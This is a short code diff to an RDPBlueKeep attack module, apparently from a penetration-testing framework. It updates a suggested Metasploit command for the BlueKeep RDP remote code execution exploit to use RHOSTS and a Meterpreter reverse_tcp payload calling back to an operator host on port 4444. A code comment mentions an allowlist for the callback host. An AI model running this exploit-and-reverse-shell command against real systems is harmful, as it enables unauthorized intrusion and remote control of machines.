@@ -17,7 +17,12 @@ class RDPBlueKeep(AttackModule):
             "status": "info",
             "module": self.name,
             "note": "Requires msfconsole module exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
-            "suggested_msf": f"exploit/windows/rdp/cve_2019_0708_bluekeep_rce target={ctx.target_ip}",
+            # Phase 2: RHOSTS (not `target`) is the MSF option run_msf_module
+            # sets; LHOST must be allowlist-authorized.
+            "suggested_msf": (
+                f"exploit/windows/rdp/cve_2019_0708_bluekeep_rce RHOSTS={ctx.target_ip} "
+                f"PAYLOAD=windows/x64/meterpreter/reverse_tcp LHOST=<op_callback> LPORT=4444"
+            ),
         }
 
 
